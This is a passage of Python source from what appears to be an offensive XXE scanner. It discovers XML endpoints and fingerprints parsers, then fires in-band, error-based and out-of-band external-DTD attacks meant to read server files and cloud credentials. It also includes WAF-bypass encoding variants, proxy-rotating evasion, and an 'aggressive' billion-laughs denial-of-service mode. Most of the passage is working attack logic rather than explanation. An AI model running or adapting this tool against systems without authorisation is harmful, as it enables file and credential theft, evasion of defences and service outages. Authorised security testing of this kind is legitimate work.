        while time.monotonic() < deadline:
            r, _, _ = select.select([self.proc.stderr], [], [], 0.5)
            if not r:
                continue
            line = self.proc.stderr.readline()
            if not line:
                break
            collected += line
            m = pattern.search(collected)
            if m:
                return m.group(1)
        return None

    def _read_interactions(self) -> None:
        if not self.proc or not self.proc.stdout:
            return
        for line in self.proc.stdout:
            line = line.strip()
            if not line:
                continue
            try:
                obj = json.loads(line)
            except json.JSONDecodeError:
                continue
            with self.lock:
                self.interactions.append(obj)
                for key in ("full-id", "unique-id", "full_id", "unique_id"):
                    val = obj.get(key)
                    if val:
                        self.interaction_ids.add(str(val).lower())

    def new_token(self, prefix: str = "argusxxe") -> str:
        return prefix + "".join(
            random.choices(string.ascii_lowercase + string.digits, k=12))

    def token_url(self, token: str) -> Optional[str]:
        if not self.domain:
            return None
        return f"http://{token}.{self.domain}"

    def check(self, token: str) -> bool:
        with self.lock:
            t = token.lower()
            return any(t in i for i in self.interaction_ids)

    def wait_and_check(self, tokens: list[str],
                       wait: float = OOB_CORRELATION_WAIT) -> set[str]:
        if not tokens or not self.use_interactsh:
            return set()
        deadline = time.monotonic() + wait
        fired: set[str] = set()
        while time.monotonic() < deadline:
            for tok in tokens:
                if tok not in fired and self.check(tok):
                    fired.add(tok)
            if len(fired) == len(tokens):
                break
            time.sleep(0.5)
        return fired

    def stop(self) -> None:
        if self.proc:
            try:
                self.proc.terminate()
                self.proc.wait(timeout=3)
            except Exception:
                try: self.proc.kill()
                except Exception: pass


# ═════════════════════════════════════════════════════════════════════════════
#  SURFACE DISCOVERY
# ═════════════════════════════════════════════════════════════════════════════

BENIGN_XML_BODY = '<?xml version="1.0"?><argus>argus_probe_marker</argus>'


def _hint_for_url(url: str) -> str:
    path = urllib.parse.urlparse(url).path.lower()
    if any(h in path for h in SOAP_PATH_HINTS):
        return "soap"
    if any(h in path for h in SAML_PATH_HINTS):
        return "saml"
    if any(h in path for h in IMPORT_PATH_HINTS):
        return "import"
    return ""


def _accepts_xml(session: EvasionSession, url: str,
                 headers: Optional[dict]) -> tuple[bool, str]:
    hdrs = {"Content-Type": "application/xml",
            "Accept": "application/xml, text/xml, */*"}
    if headers:
        hdrs.update(headers)
    resp = session.post(url, headers=hdrs, data=BENIGN_XML_BODY.encode("utf-8"))
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return False, ""
    body = _body(resp, limit=2000).lower()
    ct = resp.headers.get("Content-Type", "")
    if resp.status_code == 415:
        return False, ct
    if resp.status_code == 400 and any(
            kw in body for kw in ("media type", "content-type",
                                  "unsupported", "xml")):
        return True, ct
    if resp.status_code >= 500:
        return False, ct
    return True, ct


def discover_xml_surfaces(session: EvasionSession, urls: list[str],
                          headers: Optional[dict]) -> list[XMLSurface]:
    surfaces: list[XMLSurface] = []
    seen: set[tuple] = set()
    for url in urls:
        parsed = urllib.parse.urlparse(url)
        params = urllib.parse.parse_qs(parsed.query)
        for pname in params:
            if pname.lower() in XML_PARAM_NAMES:
                key = (url, pname, "query")
                if key not in seen:
                    seen.add(key)
                    surfaces.append(XMLSurface(
                        url=url, method="GET", param=pname,
                        location="query", hint="xml_param", accepts_xml=True))
        hint = _hint_for_url(url)
        if hint:
            key = (url, "(body)", "body")
            if key not in seen:
                seen.add(key)
                accepts, ct = _accepts_xml(session, url, headers)
                surfaces.append(XMLSurface(
                    url=url, method="POST", param="(body)",
                    location="body", hint=hint,
                    accepts_xml=accepts, content_type=ct))
        if params and not hint:
            key = (url, "(body)", "body")
            if key not in seen:
                seen.add(key)
                accepts, ct = _accepts_xml(session, url, headers)
                if accepts:
                    surfaces.append(XMLSurface(
                        url=url, method="POST", param="(body)",
                        location="body", hint="",
                        accepts_xml=True, content_type=ct))
    return surfaces


# ═════════════════════════════════════════════════════════════════════════════
#  XML REQUEST SEND
# ═════════════════════════════════════════════════════════════════════════════

def _inject_query_xml(url: str, param: str, payload: str) -> str:
    parsed = urllib.parse.urlparse(url)
    params = urllib.parse.parse_qsl(parsed.query, keep_blank_values=True)
    new = [(k, payload if k == param else v) for k, v in params]
    return urllib.parse.urlunparse(
        parsed._replace(query=urllib.parse.urlencode(new, safe="")))


def _send_xml(session: EvasionSession, surface: XMLSurface,
              body: str | bytes, headers: Optional[dict],
              timeout: Optional[int] = None) -> Optional[requests.Response]:
    if surface.location == "query":
        text = body.decode("utf-8", "ignore") if isinstance(body, bytes) else body
        test_url = _inject_query_xml(surface.url, surface.param, text)
        return session.get(test_url, headers=headers or {})
    hdrs = {"Content-Type": "application/xml", "Accept": "application/xml, */*"}
    if headers:
        hdrs.update(headers)
    payload_bytes = body.encode("utf-8") if isinstance(body, str) else body
    return session.post(surface.url, headers=hdrs, data=payload_bytes)


# ═════════════════════════════════════════════════════════════════════════════
#  PARSER FINGERPRINTING
# ═════════════════════════════════════════════════════════════════════════════

def _capability_predicate(key: str, test_resp, control_resp) -> bool:
    if test_resp is None or control_resp is None:
        return False
    test_text = _body(test_resp, limit=50_000)
    control_text = _body(control_resp, limit=50_000)
    if key == "marker_present":
        return "ARGUS_MARKER" in test_text and "ARGUS_MARKER" not in control_text
    if key == "entity_expanded":
        return "ARGUS_ENTITY_MARKER" in test_text and "&x;" not in test_text
    if key == "file_read":
        return bool(_match_markers(test_text, LINUX_FILE_MARKERS))
    if key == "pe_marker":
        return "ARGUS_PE_MARKER" in test_text and "ARGUS_PE_MARKER" not in control_text
    if key == "dtd_error":
        test_err = _fingerprint_parser(test_text)
        control_err = _fingerprint_parser(control_text)
        return bool(test_err) and test_err != control_err
    return False


def fingerprint_parser(session: EvasionSession, surface: XMLSurface,
                       headers: Optional[dict]) -> ParserProfile:
    profile = ParserProfile(url=surface.url)
    capabilities: dict[str, bool] = {}
    baseline_resp = _send_xml(session, surface,
                              '<?xml version="1.0"?><argus>argus_baseline</argus>',
                              headers)
    if baseline_resp is not None:
        profile.baseline_status = baseline_resp.status_code
        profile.baseline_length = len(_body(baseline_resp))
    error_buffer: list[str] = []
    for capability, test_body, control_body, predicate_key in CAPABILITY_PROBES:
        test_resp = _send_xml(session, surface, test_body, headers)
        time.sleep(REQUEST_SLEEP)
        control_resp = _send_xml(session, surface, control_body, headers)
        time.sleep(REQUEST_SLEEP)
        passed = _capability_predicate(predicate_key, test_resp, control_resp)
        capabilities[capability] = passed
        for r in (test_resp, control_resp):
            if r is not None and r.status_code >= 500:
                error_buffer.append(_body(r, limit=5000))
    profile.capabilities = capabilities
    combined = " ".join(error_buffer)
    profile.family = _fingerprint_parser(combined) or "unknown"
    return profile


# ═════════════════════════════════════════════════════════════════════════════
#  PAYLOAD EVALUATION
# ═════════════════════════════════════════════════════════════════════════════

def _evaluate_payload(
    session: EvasionSession, surface: XMLSurface, profile: ParserProfile,
    body: str, markers: list[str], headers: Optional[dict],
    technique: str, waf_vendor: str, auth_enabled: bool = False,
) -> Optional[XXEFinding]:
    resp = _send_xml(session, surface, body, headers)
    time.sleep(REQUEST_SLEEP)
    if resp is None:
        return None
    resp_body = _body(resp)
    hits = _match_markers(resp_body, markers)
    if not hits:
        return None
    if technique == "error" and not _fingerprint_parser(resp_body):
        return None

    # Severity: cloud credentials = CRITICAL; other file read = HIGH
    cred_hit = any(h in CLOUD_CREDENTIAL_MARKERS for h in hits)
    if cred_hit:
        severity = Severity.CRITICAL
        confidence = 95
    elif technique == "inband":
        severity = Severity.HIGH
        confidence = 92
    else:
        severity = Severity.HIGH
        confidence = 85

    return XXEFinding(
        target=surface.url, param=surface.param,
        param_location=surface.location,
        technique=technique, context=profile.family,
        severity=severity, confidence=confidence, confirmed=True,
        payload=body,
        evidence=f"File/metadata markers present: {', '.join(hits)}",
        file_read=hits[0] if hits else "",
        parser_family=profile.family,
        http_status=resp.status_code,
        waf_vendor=waf_vendor, auth_enabled=auth_enabled,
        details={
            "markers": hits, "status": resp.status_code,
            "parser_family": profile.family,
            "body_snippet": resp_body[:500],
        },
    )


def run_inband(session: EvasionSession, surface: XMLSurface,
               profile: ParserProfile, headers: Optional[dict],
               waf_vendor: str, auth_enabled: bool,
               aggressive: bool = False) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    if not profile.capabilities.get("external_file"):
        return findings
    payloads = list(INBAND_PAYLOADS[:MAX_PAYLOADS_PER_SURFACE])
    if aggressive:
        payloads.extend(AGGRESSIVE_INBAND_PAYLOADS)
    for payload in payloads:
        finding = _evaluate_payload(
            session, surface, profile, payload["body"],
            payload["markers"], headers, "inband", waf_vendor, auth_enabled)
        if finding:
            finding.details["label"] = payload["label"]
            findings.append(finding)
            if not aggressive:
                return findings  # one confirmed in-band is enough
    return findings


def run_dos(session: EvasionSession, surface: XMLSurface,
            profile: ParserProfile, headers: Optional[dict],
            waf_vendor: str, auth_enabled: bool) -> list[XXEFinding]:
    """Aggressive only — billion laughs. Detects via response time."""
    if not profile.capabilities.get("internal_entity"):
        return []
    for payload in AGGRESSIVE_DOS_PAYLOADS:
        t0 = time.monotonic()
        resp = _send_xml(session, surface, payload["body"], headers)
        elapsed = time.monotonic() - t0
        if resp is None:
            continue
        # If the request hung > 5s after a healthy baseline, entity expansion
        # is likely consuming resources
        if elapsed > 5.0 and resp.status_code >= 500:
            return [XXEFinding(
                target=surface.url, param=surface.param,
                param_location=surface.location,
                technique="dos", context=profile.family,
                severity=Severity.HIGH, confidence=70, confirmed=False,
                payload=payload["body"][:500],
                evidence=f"Billion-laughs payload caused {elapsed:.1f}s delay + HTTP {resp.status_code}",
                parser_family=profile.family, http_status=resp.status_code,
                waf_vendor=waf_vendor, auth_enabled=auth_enabled,
                details={"label": payload["label"],
                         "elapsed_s": round(elapsed, 2)},
            )]
    return []


def run_error_based(session: EvasionSession, surface: XMLSurface,
                    profile: ParserProfile, headers: Optional[dict],
                    waf_vendor: str, auth_enabled: bool) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    for payload in ERROR_PAYLOADS:
        if not profile.capabilities.get(payload["requires"]):
            continue
        finding = _evaluate_payload(
            session, surface, profile, payload["body"],
            payload["markers"], headers, "error", waf_vendor, auth_enabled)
        if finding:
            finding.details["label"] = payload["label"]
            findings.append(finding)
            return findings
    return findings


def run_oob(session: EvasionSession, surface: XMLSurface,
            profile: ParserProfile, oob: OOBCapture,
            headers: Optional[dict], waf_vendor: str,
            auth_enabled: bool) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    if not oob.domain:
        return findings
    token = oob.new_token()
    oob_url = oob.token_url(token)
    if not oob_url:
        return findings
    ping_body = OOB_PING_TEMPLATE.format(oob=oob_url)
    _ = _send_xml(session, surface, ping_body, headers)
    time.sleep(REQUEST_SLEEP)
    full_body = OOB_PAYLOAD_TEMPLATE.format(oob=oob_url)
    resp2 = _send_xml(session, surface, full_body, headers)
    time.sleep(REQUEST_SLEEP)
    findings.append(XXEFinding(
        target=surface.url, param=surface.param,
        param_location=surface.location,
        technique="oob", context=profile.family,
        severity=Severity.HIGH if not oob.use_interactsh else Severity.CRITICAL,
        confidence=60 if not oob.use_interactsh else 85,
        confirmed=False, payload=full_body,
        evidence=(f"External DTD payload sent to {oob_url}/evil.dtd — "
                  + ("correlating OOB interactions" if oob.use_interactsh
                     else "verify manually in your OOB dashboard")),
        oob_token=token, parser_family=profile.family,
        http_status=resp2.status_code if resp2 else 0,
        waf_vendor=waf_vendor, auth_enabled=auth_enabled,
        details={"oob_url": oob_url,
                 "evil_dtd": OOB_EVIL_DTD.replace("{oob}", oob_url),
                 "mode": "interactsh" if oob.use_interactsh else "manual"},
    ))
    return findings


def confirm_oob_batch(oob: OOBCapture,
                      findings: list[XXEFinding]) -> list[XXEFinding]:
    if not oob.use_interactsh:
        return findings
    tokens = [f.oob_token for f in findings if f.oob_token]
    if not tokens:
        return findings
    log.info(f"    Waiting {OOB_CORRELATION_WAIT:.0f}s for OOB callbacks...")
    fired = oob.wait_and_check(tokens)
    for f in findings:
        if f.oob_token in fired:
            f.severity = Severity.CRITICAL
            f.confidence = 95
            f.confirmed = True
            f.oob_confirmed = True
            f.evidence = (f"Out-of-band callback received for token {f.oob_token} — "
                          f"parser fetched the external DTD")
            f.details["oob_confirmed"] = True
    return findings


def run_bypass(session: EvasionSession, surface: XMLSurface,
               profile: ParserProfile, headers: Optional[dict],
               waf_vendor: str, auth_enabled: bool) -> list[XXEFinding]:
    findings: list[XXEFinding] = []
    if not profile.capabilities.get("external_file"):
        return findings
    base_payload = INBAND_PAYLOADS[0]["body"]
    base_markers = INBAND_PAYLOADS[0]["markers"]
    for variant_bytes, label in _waf_variants_xml(base_payload):
        if surface.location == "query":
            if label in ("utf16be", "utf16le"):
                continue
            text = variant_bytes.decode("utf-8", "ignore")
            test_url = _inject_query_xml(surface.url, surface.param, text)
            resp = session.get(test_url, headers=headers or {})
        else:
            hdrs = {"Content-Type": "application/xml"}
            if headers:
                hdrs.update(headers)
            resp = session.post(surface.url, headers=hdrs, data=variant_bytes)
        time.sleep(REQUEST_SLEEP)
        if resp is None:
            continue
        body_text = _body(resp)
        hits = _match_markers(body_text, base_markers)
        if hits:
            findings.append(XXEFinding(
                target=surface.url, param=surface.param,
                param_location=surface.location,
                technique="bypass", context=profile.family,
                severity=Severity.CRITICAL, confidence=90, confirmed=True,
                payload=f"[{label}] {base_payload}",
                evidence=f"WAF bypass '{label}' triggered file read: {', '.join(hits)}",
                file_read=hits[0], parser_family=profile.family,
                bypass_used=label, http_status=resp.status_code,
                waf_vendor=waf_vendor, auth_enabled=auth_enabled,
                details={"variant": label, "markers": hits},
            ))
            return findings
    return findings


# ═════════════════════════════════════════════════════════════════════════════
#  PER-SURFACE ORCHESTRATION
# ═════════════════════════════════════════════════════════════════════════════

def _process_surface(
    session: EvasionSession, surface: XMLSurface,
    headers: Optional[dict], oob: OOBCapture, waf_vendor: str,
    auth_enabled: bool,
    test_error_based: bool, test_oob: bool, test_bypass: bool,
    aggressive: bool,
) -> dict:
    out = {"url": surface.url, "param": surface.param,
           "location": surface.location, "findings": [],
           "profile": None, "note": ""}
    try:
        profile = fingerprint_parser(session, surface, headers)
        out["profile"] = profile.to_dict()
        caps_str = ",".join(k for k, v in profile.capabilities.items() if v) or "none"
        out["note"] = f"parser={profile.family} caps=[{caps_str}]"

        inband = run_inband(session, surface, profile, headers,
                            waf_vendor, auth_enabled, aggressive)
        out["findings"].extend(inband)

        if test_error_based and not inband:
            errors = run_error_based(session, surface, profile, headers,
                                     waf_vendor, auth_enabled)
            out["findings"].extend(errors)

        if test_oob:
            oob_findings = run_oob(session, surface, profile, oob,
                                   headers, waf_vendor, auth_enabled)
            out["findings"].extend(oob_findings)

        if test_bypass and not inband and not any(
                f.technique == "error" for f in out["findings"]):
            bypass = run_bypass(session, surface, profile, headers,
                                waf_vendor, auth_enabled)
            out["findings"].extend(bypass)

        if aggressive and not any(f.confirmed for f in out["findings"]):
            dos = run_dos(session, surface, profile, headers,
                          waf_vendor, auth_enabled)
            out["findings"].extend(dos)

        # Update note
        if any(f.confirmed for f in out["findings"]):
            top = next(f for f in out["findings"] if f.confirmed)
            out["note"] += f" | {top.technique} CONFIRMED ({top.file_read or 'ssrf'})"

        return out
    except Exception as e:
        out["note"] = f"error: {type(e).__name__}: {e}"
        log.debug(f"    surface error: {out['note']}")
        return out


# ═════════════════════════════════════════════════════════════════════════════
#  EVIDENCE PRESERVATION
# ═════════════════════════════════════════════════════════════════════════════

def _save_evidence(finding: XXEFinding, evidence_dir: Path) -> None:
    try:
        evidence_dir.mkdir(parents=True, exist_ok=True)
        base = finding.finding_hash[:16]
        (evidence_dir / f"{base}_evidence.txt").write_text(
            f"finding_hash: {finding.finding_hash}\n"
            f"target: {finding.target}\n"
            f"param: {finding.param} ({finding.param_location})\n"
            f"technique: {finding.technique}\n"
            f"severity: {finding.severity.value}\n"
            f"confidence: {finding.confidence}\n"
            f"confirmed: {finding.confirmed}\n"
            f"parser_family: {finding.parser_family}\n"
            f"file_read: {finding.file_read}\n"
            f"waf_vendor: {finding.waf_vendor}\n"
            f"payload:\n{finding.payload}\n\n"
            f"evidence: {finding.evidence}\n"
            f"details: {json.dumps(finding.details, indent=2)}\n")
    except Exception as e:
        log.debug(f"evidence save failed: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  DB SELF-SYNC
# ═════════════════════════════════════════════════════════════════════════════

def _self_sync(scan_id: int, findings: list[XXEFinding]) -> None:
    if not findings or not DB_AVAILABLE or DB is None:
        return
    if not _cfg("SYNC_TO_DB", True) or not _cfg("BRIDGE_ENABLED", False):
        return
    if not getattr(DB, "available", False):
        return
    upsert = getattr(DB, "upsert_xxe_findings", None)
    if upsert is None:
        log.warning("  DB sync: db.py missing upsert_xxe_findings()")
        return
    try:
        payloads = [f.to_dict() for f in findings]
        n = upsert(scan_id, payloads)
        if n is not None:
            log.info(f"  DB sync: {n} row(s) upserted into xxe_findings (scan_id={scan_id})")
    except Exception as e:
        log.error(f"  DB sync: exception — {type(e).__name__}: {e}")


# ═════════════════════════════════════════════════════════════════════════════
#  PUBLIC ENTRY POINT
# ═════════════════════════════════════════════════════════════════════════════

def run_xxe_scan(
    urls_file: Path, outdir: Path, *,
    headers: Optional[dict] = None,
    oob_domain: Optional[str] = None,
    use_interactsh: bool = False,
    test_error_based: bool = True,
    test_oob: bool = True,
    test_bypass: bool = True,
    aggressive: bool = False,
    max_surfaces: Optional[int] = None,
    rate_limit: Optional[int] = None,
    concurrency: Optional[int] = None,
    timeout: Optional[int] = None,
    proxies: Optional[list[str]] = None,
    scan_id: Optional[int] = None,
) -> Path:
    start = time.monotonic()
    settings = _xxe_settings()
    eff_rate    = rate_limit if rate_limit is not None else settings["rate_limit"]
    eff_conc    = concurrency if concurrency is not None else settings["concurrency"]
    eff_timeout = timeout if timeout is not None else settings["timeout"]
    eff_max     = max_surfaces if max_surfaces is not None else settings["max_surfaces"]
    eff_jitter  = settings["jitter"]
    eff_proxies = proxies if proxies is not None else list(settings["proxies"])
    verify_tls  = settings["verify_tls"]

    merged_headers = _target_headers()
    if headers:
        for k, v in headers.items():
            merged_headers.setdefault(k, v)
    auth_enabled = bool(merged_headers)

    urls = _load_urls(urls_file)
    outdir.mkdir(parents=True, exist_ok=True)
    evidence_dir = outdir / "xxe_evidence"

    log.info(f"  Input  : {len(urls)} URL(s) from {urls_file.name}")
    log.info(f"  Config : rate={eff_rate}/s  jitter={eff_jitter}s  "
             f"concurrency={eff_conc}  timeout={eff_timeout}s  "
             f"max_surfaces={eff_max}")
    log.info(f"  Mode   : {'AGGRESSIVE' if aggressive else 'safe'}")
    log.info(f"  Auth   : {'yes' if auth_enabled else 'no'}")
    if eff_proxies:
        log.info(f"  Proxies: {len(eff_proxies)} (rotation)")

    if not urls:
        log.warning("  No URLs — writing empty report")
        return _write_empty(outdir, urls_file, start)

    oob = OOBCapture(domain=oob_domain, use_interactsh=use_interactsh)
    oob_active = oob.start()

    profile = EvasionProfile(
        rate_limit=eff_rate, jitter=eff_jitter, proxies=eff_proxies,
    )

    with EvasionSession(profile, merged_headers, eff_timeout,
                        verify_tls=verify_tls) as session:
        # ── Phase 0: WAF detection ─────────────────────────────────────────
        log.info("")
        log.info("  Phase 0 — WAF detection")
        waf_by_host: dict[str, WAFReport] = {}
        seen_hosts: set[str] = set()
        for url in urls[:50]:
            host = urllib.parse.urlparse(url).hostname or ""
            if not host or host in seen_hosts:
                continue
            seen_hosts.add(host)
            waf = detect_waf(session, url)
            waf_by_host[host] = waf
            if waf.vendor != "unknown":
                log.info(f"    {host:<40} WAF: {waf.vendor} ({waf.confidence}%)")

        if any(w.vendor != "unknown" for w in waf_by_host.values()):
            session.profile.rate_limit = max(0.5, eff_rate * 0.6)
            session.profile.jitter = max(eff_jitter, 0.8)

        # ── Phase 1: Surface discovery ─────────────────────────────────────
        log.info("")
        log.info("  Phase 1 — XML surface discovery")
        surfaces = discover_xml_surfaces(session, urls, merged_headers or None)
        if len(surfaces) > eff_max:
            log.warning(f"    Capping at {eff_max} surfaces (had {len(surfaces)})")
            surfaces = surfaces[:eff_max]
        (outdir / "xxe_surface.txt").write_text(
            "\n".join(f"{s.method}\t{s.url}\t{s.param}\t{s.location}\t"
                      f"{s.hint or '-'}\t{s.accepts_xml}" for s in surfaces)
            + ("\n" if surfaces else ""))
        log.info(f"    {len(surfaces)} XML-accepting surface(s)")

        if not surfaces:
            log.warning("  No XML surfaces — writing empty report")
            oob.stop()
            return _write_empty(outdir, urls_file, start, total_input=len(urls))

        # ── Phase 2-7: Per-surface (threaded) ─────────────────────────────
        log.info("")
        log.info(f"  Testing {len(surfaces)} surface(s) (concurrency={eff_conc})")

        all_findings: list[XXEFinding] = []
        profiles: list[ParserProfile] = []
        results: list[dict] = []

        def _run(i: int, s: XMLSurface) -> None:
            try:
                host = urllib.parse.urlparse(s.url).hostname or ""
                waf = waf_by_host.get(host, WAFReport())
                out = _process_surface(
                    session, s, merged_headers or None, oob, waf.vendor,
                    auth_enabled, test_error_based, test_oob, test_bypass,
                    aggressive)
                if out["profile"]:
                    profiles.append(ParserProfile(
                        url=out["profile"]["url"],
                        family=out["profile"]["family"],
                        capabilities=out["profile"]["capabilities"],
                        baseline_status=out["profile"]["baseline_status"],
                        baseline_length=out["profile"]["baseline_length"]))
                all_findings.extend(out["findings"])
                results.append({
                    "url": out["url"], "param": out["param"],
                    "location": out["location"], "profile": out["profile"],
                    "findings": len(out["findings"]), "note": out["note"]})
                if out["findings"]:
                    top = out["findings"][0]
                    log.info(f"    [{i:>3}/{len(surfaces)}] {top.technique:<8} "
                             f"{top.severity.value:<8} {top.parser_family:<12} "
                             f"{_redact_url(out['url'], 40)} param={out['param']}")
                elif i % 20 == 0:
                    log.info(f"    [{i:>3}/{len(surfaces)}] {out.get('note', '')[:80]}")
            except Exception as e:
                log.debug(f"    run error: {type(e).__name__}: {e}")

        try:
            with ThreadPoolExecutor(max_workers=eff_conc) as pool:
                futures = {
                    pool.submit(_run, i, s): i
                    for i, s in enumerate(surfaces, 1)
                }
                for fut in as_completed(futures):
                    try: fut.result()
                    except Exception: pass

            if oob_active and test_oob:
                all_findings = confirm_oob_batch(oob, all_findings)
        finally:
            oob.stop()

    # ── Dedupe + sort ──────────────────────────────────────────────────────
    seen: set[tuple] = set()
    deduped: list[XXEFinding] = []
    for f in all_findings:
        key = (f.target, f.param, f.param_location, f.technique,
               f.details.get("label", "") or f.bypass_used)
        if key not in seen:
            seen.add(key)
            f.auth_enabled = auth_enabled
            if not f.first_seen:
                f.first_seen = _db_now()
            deduped.append(f)
    deduped.sort(key=lambda f: (-f.severity.rank, 0 if f.confirmed else 1,
                                -f.confidence, f.target))

    # ── Chains ─────────────────────────────────────────────────────────────
    log.info("")
    log.info("  Chain aggregation")
    chains = build_chains(deduped)
    log.info(f"    {len(chains)} chain(s)")

    # ── Reports ────────────────────────────────────────────────────────────
    elapsed = time.monotonic() - start
    by_sev: dict[str, int] = {"CRITICAL": 0, "HIGH": 0, "MEDIUM": 0, "LOW": 0, "INFO": 0}
    by_technique: dict[str, int] = {}
    by_family: dict[str, int] = {}
    confirmed = []
    for f in deduped:
        by_sev[f.severity.value] = by_sev.get(f.severity.value, 0) + 1
        by_technique[f.technique] = by_technique.get(f.technique, 0) + 1
        if f.parser_family:
            by_family[f.parser_family] = by_family.get(f.parser_family, 0) + 1
        if f.confirmed:
            confirmed.append(f)
            _save_evidence(f, evidence_dir)

    # Flat files
    (outdir / "xxe_candidates.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.severity.value}\t"
            f"{f.confidence}\t{f.parser_family}\t"
            f"{'CONFIRMED' if f.confirmed else 'candidate'}\t{f.evidence[:140]}"
            for f in deduped) + ("\n" if deduped else ""))

    confirmed_files = [f for f in confirmed
                       if f.technique in ("inband", "error", "bypass")]
    (outdir / "xxe_confirmed.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.technique}\t{f.parser_family}\t"
            f"{f.file_read or f.evidence[:100]}"
            for f in confirmed_files) + ("\n" if confirmed_files else ""))

    oob_findings = [f for f in deduped if f.technique == "oob"]
    (outdir / "xxe_oob.txt").write_text(
        "\n".join(
            f"{f.target}\t{f.param}\t{f.oob_token}\t{f.severity.value}\t"
            f"{f.confidence}\t{'CONFIRMED' if f.oob_confirmed else 'candidate'}\t"
            f"{f.details.get('oob_url', '')}"
            for f in oob_findings) + ("\n" if oob_findings else ""))

    (outdir / "xxe_fingerprints.txt").write_text(
        "\n".join(f"{p.url}\t{p.family}\t"
                  f"{','.join(k for k, v in p.capabilities.items() if v)}"
                  for p in profiles) + ("\n" if profiles else ""))

    # Full report
    json_path = outdir / "xxe_findings.json"
    report = {
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(elapsed, 2),
        "input_file": str(urls_file),
        "scan_id": scan_id,
        "aggressive": aggressive,
        "config": {
            "oob_domain": oob_domain, "interactsh": use_interactsh,
            "error_based": test_error_based, "oob": test_oob,
            "bypass": test_bypass, "authenticated": auth_enabled,
            "rate_limit": eff_rate, "jitter": eff_jitter,
            "concurrency": eff_conc, "timeout": eff_timeout,
            "max_surfaces": eff_max, "proxies": len(eff_proxies),
            "verify_tls": verify_tls,
        },
        "totals": {
            "urls_input": len(urls), "surfaces_tested": len(surfaces),
            "total_findings": len(deduped), "confirmed": len(confirmed),
            "oob_findings": len(oob_findings),
            "oob_confirmed": sum(1 for f in oob_findings if f.oob_confirmed),
            "critical": by_sev["CRITICAL"], "high": by_sev["HIGH"],
            "medium": by_sev["MEDIUM"], "low": by_sev["LOW"],
            "info": by_sev["INFO"],
        },
        "summary": {
            "by_severity": by_sev,
            "by_technique": dict(sorted(by_technique.items(), key=lambda kv: -kv[1])),
            "by_parser": dict(sorted(by_family.items(), key=lambda kv: -kv[1])),
        },
        "surfaces": [s.to_dict() for s in surfaces],
        "profiles": [p.to_dict() for p in profiles],
        "results": results,
        "findings": [f.to_dict() for f in deduped],
    }
    json_path.write_text(json.dumps(report, indent=2, ensure_ascii=False) + "\n")

    # Confirmed-only report
    confirmed_high = [f for f in deduped if f.severity.rank >= Severity.HIGH.rank]
    (outdir / "xxe_confirmed.json").write_text(
        json.dumps({
            "schema_version": FINDING_SCHEMA_VERSION,
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "input_file": str(urls_file),
            "totals": {
                "confirmed": len(confirmed_high),
                "critical": sum(1 for f in confirmed_high if f.severity == Severity.CRITICAL),
                "high": sum(1 for f in confirmed_high if f.severity == Severity.HIGH),
                "by_chain": {cid: sum(1 for f in confirmed_high if cid in f.chain_ids)
                             for cid in {x for f in confirmed_high for x in f.chain_ids}},
                "by_parser": dict(sorted(by_family.items(), key=lambda kv: -kv[1])),
            },
            "findings": [f.to_dict() for f in confirmed_high],
        }, indent=2, ensure_ascii=False) + "\n")

    # Chains
    (outdir / "xxe_chains.json").write_text(
        json.dumps({
            "generated_at": datetime.now(timezone.utc).isoformat(),
            "chains": [c.to_dict() for c in chains],
        }, indent=2, ensure_ascii=False) + "\n")

    # DB sync
    if scan_id is not None:
        _self_sync(scan_id, deduped)

    # Console summary
    log.info("")
    log.info("  Outputs :")
    log.info(f"    xxe_findings.json            {len(deduped):>5} finding(s)")
    log.info(f"    xxe_confirmed.json           {len(confirmed_high):>5} confirmed (HIGH+)")
    log.info(f"    xxe_chains.json              {len(chains):>5} chain(s)")
    log.info(f"    xxe_candidates.txt           {len(deduped):>5} candidate(s)")
    log.info(f"    xxe_confirmed.txt            {len(confirmed_files):>5} confirmed file-read")
    log.info(f"    xxe_oob.txt                  {len(oob_findings):>5} OOB finding(s)")
    log.info(f"    xxe_surface.txt              {len(surfaces):>5} surface(s)")
    log.info(f"    xxe_fingerprints.txt         {len(profiles):>5} fingerprint(s)")
    if confirmed:
        log.info(f"    xxe_evidence/                {len(confirmed):>5} evidence file(s)")
    log.info("")
    log.info(f"  Severity : CRITICAL={by_sev['CRITICAL']}  HIGH={by_sev['HIGH']}  "
             f"MEDIUM={by_sev['MEDIUM']}  LOW={by_sev['LOW']}  INFO={by_sev['INFO']}")
    if by_technique:
        log.info("  Technique: " + " · ".join(f"{k}({v})" for k, v in by_technique.items()))
    if by_family:
        log.info("  Parser   : " + " · ".join(f"{k}({v})" for k, v in by_family.items()))
    if chains:
        log.info("  Chains   : " + " · ".join(
            f"{c.chain_id}({c.severity.value})" for c in chains))
    if confirmed_high:
        log.info("")
        log.info("  Confirmed XXE findings (top 10):")
        for f in confirmed_high[:10]:
            tag = f" [{','.join(f.chain_ids)}]" if f.chain_ids else ""
            log.info(f"    [{f.severity.value:<8}] {f.technique:<8} "
                     f"{f.parser_family:<12} {f.param:<14} "
                     f"{_redact_url(f.target, 45)}{tag}")
    oob_confirmed = [f for f in oob_findings if f.oob_confirmed]
    if oob_findings and not oob_confirmed and not use_interactsh:
        log.info("")
        log.info(f"  Blind OOB: {len(oob_findings)} candidate(s) — deploy manually:")
        log.info(f"    see xxe_oob.txt (evil.dtd templates in details)")
    log.info("")
    log.info(f"  Completed in {elapsed:.1f}s")
    return json_path


def _write_empty(outdir: Path, input_file: Path, start: float,
                 total_input: int = 0) -> Path:
    outdir.mkdir(parents=True, exist_ok=True)
    report = {
        "schema_version": FINDING_SCHEMA_VERSION,
        "generated_at": datetime.now(timezone.utc).isoformat(),
        "elapsed_seconds": round(time.monotonic() - start, 2),
        "input_file": str(input_file),
        "config": {},
        "totals": {"urls_input": total_input, "surfaces_tested": 0,
                   "total_findings": 0, "confirmed": 0,
                   "oob_findings": 0, "oob_confirmed": 0,
                   "critical": 0, "high": 0, "medium": 0, "low": 0, "info": 0},
        "summary": {"by_severity": {}, "by_technique": {}, "by_parser": {}},
        "surfaces": [], "profiles": [], "results": [], "findings": [],
    }
